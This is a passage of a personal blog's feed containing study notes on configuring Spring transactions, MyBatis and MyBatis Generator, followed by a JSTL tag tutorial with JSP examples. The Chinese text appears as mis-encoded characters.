--&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"pooleDataSource"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- å¼€å¯åŸºäºæ³¨è§£çš„äº‹åŠ¡ï¼Œä½¿ç”¨xmlé…ç½®å½¢å¼çš„äº‹åŠ¡(å¿…è¦ä¸»è¦çš„éƒ½æ˜¯ä½¿ç”¨é…ç½®å¼)   --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!-- åˆ‡å…¥ç‚¹è¡¨è¾¾å¼--&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"txPoint"</span> <span class="attr">expression</span>=<span class="string">"execution(* com.ceit.crud.service..*(..))"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!-- é…ç½®äº‹åŠ¡å¢å¼º   --&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">"txAdvice"</span>  <span class="attr">pointcut-ref</span>=<span class="string">"txPoint"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--  é…ç½®äº‹åŠ¡å¢å¼ºï¼Œäº‹åŠ¡å¦‚ä½•åˆ‡å…¥  --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">"txAdvice"</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="comment">&lt;!--  æ‰€æœ‰æ–¹æ³•éƒ½æ˜¯äº‹åŠ¡æ–¹æ³•  --&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"*"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="comment">&lt;!--   getå¼€å§‹çš„æ‰€æœ‰æ–¹æ³•   --&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"get*"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--  Springé…ç½®æ–‡ä»¶çš„æ ¸å¿ƒç‚¹(æ•°æ®æºï¼Œä¸mybatisçš„æ•´åˆï¼Œäº‹åŠ¡æ§åˆ¶)  --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br><img src="/img/JavaWeb/9-17å­¦ä¹ æ—¥è®°/3.png" alt="avatar"></p><h3 id="MyBatisåŠé€†å‘å·¥ç¨‹é…ç½®æ–‡ä»¶"><a href="#MyBatisåŠé€†å‘å·¥ç¨‹é…ç½®æ–‡ä»¶" class="headerlink" title="MyBatisåŠé€†å‘å·¥ç¨‹é…ç½®æ–‡ä»¶"></a>MyBatisåŠé€†å‘å·¥ç¨‹é…ç½®æ–‡ä»¶</h3><p>é¦–å…ˆé…ç½®mybatis-config.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE configuration</span></span><br><span class="line"><span class="meta">        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"</span></span><br><span class="line"><span class="meta">        "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">"mapUnderscoreToCamelCase"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"com.ceit.crud.bean"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>æ¥ç€åœ¨mavenä¸­æ·»åŠ æ’ä»¶<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  mybatis      --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configurationFile</span>&gt;</span>src/main/resources/generatorConfig.xml<span class="tag">&lt;/<span class="name">configurationFile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">verbose</span>&gt;</span>true<span class="tag">&lt;/<span class="name">verbose</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">overwrite</span>&gt;</span>true<span class="tag">&lt;/<span class="name">overwrite</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">id</span>&gt;</span>Generate MyBatis Artifacts<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">goal</span>&gt;</span>generate<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><br>è¿˜éœ€è¦æ·»åŠ mybatisçš„ä¾èµ–<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mybatis generator   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>æ¥ç€åˆ›å»ºgeneratorConfig.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE generatorConfiguration</span></span><br><span class="line"><span class="meta">        PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"</span></span><br><span class="line"><span class="meta">        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- æ•°æ®åº“é©±åŠ¨:é€‰æ‹©ä½ çš„æœ¬åœ°ç¡¬ç›˜ä¸Šé¢çš„æ•°æ®åº“é©±åŠ¨åŒ…--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classPathEntry</span> <span class="attr">location</span>=<span class="string">"C:\Users\songf\.m2\repository\mysql\mysql-connector-java\8.0.11\mysql-connector-java-8.0.11.jar"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">"DB2Tables"</span> <span class="attr">targetRuntime</span>=<span class="string">"MyBatis3"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suppressDate"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- æ˜¯å¦å»é™¤è‡ªåŠ¨ç”Ÿæˆçš„æ³¨é‡Š trueï¼šæ˜¯ ï¼š false:å¦ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suppressAllComments"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--æ•°æ®åº“é“¾æ¥URLï¼Œç”¨æˆ·åã€å¯†ç  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">"com.mysql.cj.jdbc.Driver"</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">connectionURL</span>=<span class="string">"jdbc:mysql://localhost:3306/ssm_crud?useSSL=false&amp;amp;serverTimezone=UTC"</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">userId</span>=<span class="string">"root"</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">password</span>=<span class="string">"root"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaTypeResolver</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"forceBigDecimals"</span> <span class="attr">value</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaTypeResolver</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- ç”Ÿæˆæ¨¡å‹çš„åŒ…åå’Œä½ç½®--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">"com.ceit.crud.bean"</span> <span class="attr">targetProject</span>=<span class="string">"src/main/java"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"trimStrings"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- ç”Ÿæˆæ˜ å°„æ–‡ä»¶çš„åŒ…åå’Œä½ç½®--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">"mapper"</span> <span class="attr">targetProject</span>=<span class="string">"src/main/resources"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- ç”ŸæˆDAOçš„åŒ…åå’Œä½ç½®--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">type</span>=<span class="string">"XMLMAPPER"</span> <span class="attr">targetPackage</span>=<span class="string">"com.ceit.crud.dao"</span> <span class="attr">targetProject</span>=<span class="string">"src/main/java"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- è¦ç”Ÿæˆçš„è¡¨ tableNameæ˜¯æ•°æ®åº“ä¸­çš„è¡¨åæˆ–è§†å›¾å domainObjectNameæ˜¯å®ä½“ç±»å--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;table tableName="dicom_file" domainObjectName="DicomFile" enableCountByExample="false" enableUpdateByExample="false" enableDeleteByExample="false" enableSelectByExample="false" selectByExampleQueryId="false"/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">"tbl_emp"</span> <span class="attr">domainObjectName</span>=<span class="string">"Employee"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">"tbl_dept"</span> <span class="attr">domainObjectName</span>=<span class="string">"Department"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure><br>åˆ·æ–°mavenå¯åŠ¨å°±è¡Œ</p><p>æ³¨æ„ï¼šgeneratorConfig.xmlåœ¨IDEAç¯å¢ƒä¸­å¿…é¡»æ”¾åœ¨resourcesä¸­</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;åŸºç¡€ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#åŸºç¡€ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;åŸºç¡€ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;åŸºç¡€ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;åˆ›å»ºä¸€ä¸ªmavenå·¥ç¨‹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å¼•å…¥é¡¹ç›®ä¾èµ–çš„jaråŒ…&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-2020/9/7-JSTL</title>
    <link href="http://yoursite.com/2020/09/07/JavaWeb-2020-9-7-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/09/07/JavaWeb-2020-9-7-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-09-07T07:46:54.000Z</published>
    <updated>2021-02-21T04:58:06.955Z</updated>
    
    <content type="html"><![CDATA[<p><del>é¸½äº†ä¸€ä¸ªæœˆï¼Œæˆ‘åˆå›æ¥äº†</del></p><h1 id="JSTL"><a href="#JSTL" class="headerlink" title="JSTL"></a>JSTL</h1><ol><li><p>æ¦‚å¿µï¼šJavaServer Pages Tag Library  JSPæ ‡å‡†æ ‡ç­¾åº“</p><ul><li>æ˜¯ç”±Apacheç»„ç»‡æä¾›çš„å¼€æºçš„å…è´¹çš„jspæ ‡ç­¾</li></ul></li><li><p>ä½œç”¨ï¼šç”¨äºç®€åŒ–å’Œæ›¿æ¢jspé¡µé¢ä¸Šçš„javaä»£ç </p></li><li><p>ä½¿ç”¨æ­¥éª¤</p><ol><li><p>å¯¼å…¥jaråŒ…</p></li><li><p>å¼•å…¥æ ‡ç­¾åº“ï¼štaglibæŒ‡ä»¤ï¼š&lt;%@ taglib %></p></li><li><p>ä½¿ç”¨æ ‡ç­¾</p></li></ol></li></ol><h2 id="å¸¸ç”¨æ ‡ç­¾"><a href="#å¸¸ç”¨æ ‡ç­¾" class="headerlink" title="å¸¸ç”¨æ ‡ç­¾"></a>å¸¸ç”¨æ ‡ç­¾</h2><ol><li><p>ifï¼šç›¸å½“äºJavaä»£ç çš„ifè¯­å¥</p></li><li><p>chooseï¼šç›¸å½“äºJavaä»£ç çš„switchè¯­å¥</p></li><li><p>foreachï¼šç›¸å½“äºJavaä»£ç çš„forè¯­å¥</p></li></ol><h3 id="ifæ ‡ç­¾"><a href="#ifæ ‡ç­¾" class="headerlink" title="ifæ ‡ç­¾"></a>ifæ ‡ç­¾</h3><ol><li><p>å±æ€§ï¼š</p><ul><li><p>test å¿…é¡»å±æ€§ï¼šæ¥å—booleanè¡¨è¾¾å¼</p><ul><li><p>å¦‚æœè¡¨è¾¾å¼ä¸ºtrueï¼Œåˆ™æ˜¾ç¤ºifæ ‡ç­¾ä½“å†…å®¹ï¼Œå¦‚æœä¸ºfalseï¼Œåˆ™ä¸æ˜¾ç¤ºæ ‡ç­¾ä½“å†…å®¹</p></li><li><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œtestå±æ€§ä¼šç»“åˆelè¡¨è¾¾å¼ä¸€èµ·ä½¿ç”¨</p></li></ul></li></ul></li><li><p>æ³¨æ„ï¼šc:ifæ ‡ç­¾æ²¡æœ‰elseæƒ…å†µï¼Œæƒ³è¦elseæƒ…å†µï¼Œåˆ™å¯ä»¥å†å®šä¹‰ä¸€ä¸ªc:ifæ ‡ç­¾</p></li></ol><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">import</span>=<span class="string">"java.util.ArrayList"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">import</span>=<span class="string">"java.util.List"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"c"</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ifæ ‡ç­¾<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">c:ifæ ‡ç­¾</span></span><br><span class="line"><span class="xml">  1. å±æ€§ï¼š</span></span><br><span class="line"><span class="xml">    Â· test å¿…é¡»å±æ€§ï¼šæ¥å—booleanè¡¨è¾¾å¼</span></span><br><span class="line"><span class="xml">      Â· å¦‚æœè¡¨è¾¾å¼ä¸ºtrueï¼Œåˆ™æ˜¾ç¤ºifæ ‡ç­¾ä½“å†…å®¹ï¼Œå¦‚æœä¸ºfalseï¼Œåˆ™ä¸æ˜¾ç¤ºæ ‡ç­¾ä½“å†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="xml">      ` ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œtestå±æ€§ä¼šç»“åˆelè¡¨è¾¾å¼ä¸€èµ·ä½¿ç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="xml">   2. æ³¨æ„ï¼šc:ifæ ‡ç­¾æ²¡æœ‰elseæƒ…å†µï¼Œæƒ³è¦elseæƒ…å†µï¼Œåˆ™å¯ä»¥å†å®šä¹‰ä¸€ä¸ªc:ifæ ‡ç­¾</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"true"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        æˆ‘æ˜¯çœŸ...</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        //åˆ¤æ–­requeståŸŸä¸­çš„ä¸€ä¸ªlisté›†åˆæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºnullåˆ™æ˜¾ç¤ºéå†é›†åˆ</span></span><br><span class="line"><span class="xml">        List list=new ArrayList<span class="tag">&lt;&gt;</span>();</span></span><br><span class="line"><span class="xml">        list.add("aaaa");</span></span><br><span class="line"><span class="xml">        request.setAttribute("list",list);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        request.setAttribute("number",3);</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;not empty list&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        éå†é›†åˆ...</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number %2 !=0&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        $</span><span class="template-variable">&#123;number&#125;</span><span class="xml">ä¸ºå¥‡æ•°</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;number %2 ==0&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        $</span><span class="template-variable">&#123;number&#125;</span><span class="xml">ä¸ºå¶æ•°</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/img/JavaWeb/9-7å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p><h3 id="chooseæ ‡ç­¾"><a href="#chooseæ ‡ç­¾" class="headerlink" title="chooseæ ‡ç­¾"></a>chooseæ ‡ç­¾</h3><ul><li><p>å®Œæˆæ•°å­—ç¼–å·å¯¹åº”æ˜ŸæœŸå‡ æ¡ˆä¾‹</p><ol><li><p>åŸŸä¸­å­˜å‚¨ä¸€ä¸ªæ•°å­—</p></li><li><p>ä½¿ç”¨chooseæ ‡ç­¾å–å‡ºæ•°å­—  ç›¸å½“äºswitchå£°æ˜</p></li><li><p>ä½¿ç”¨whenæ ‡ç­¾åšæ•°å­—åˆ¤æ–­  ç›¸å½“äºcase</p></li><li><p>otherwiseæ ‡ç­¾åšå…¶ä»–æƒ…å†µçš„å£°æ˜  ç›¸å½“äºdefault</p></li></ol></li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 